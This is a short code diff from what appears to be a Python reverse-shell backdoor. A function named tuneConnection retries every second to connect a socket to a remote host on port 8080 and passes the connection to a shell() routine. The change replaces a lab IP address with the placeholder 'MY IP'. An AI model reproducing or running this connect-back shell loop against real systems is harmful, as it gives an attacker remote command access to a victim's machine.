@@ -21,7 +21,7 @@ def tuneConnection():
     while True:
         time.sleep(1)
         try:
-            mySocket.connect(('192.168.81.128', 8080))
+            mySocket.connect(('MY IP', 8080))
             shell(mySocket)
 
         except:
@@ -101,6 +101,7 @@ def main():
     initiate()
 
 main()
+
 
 
 
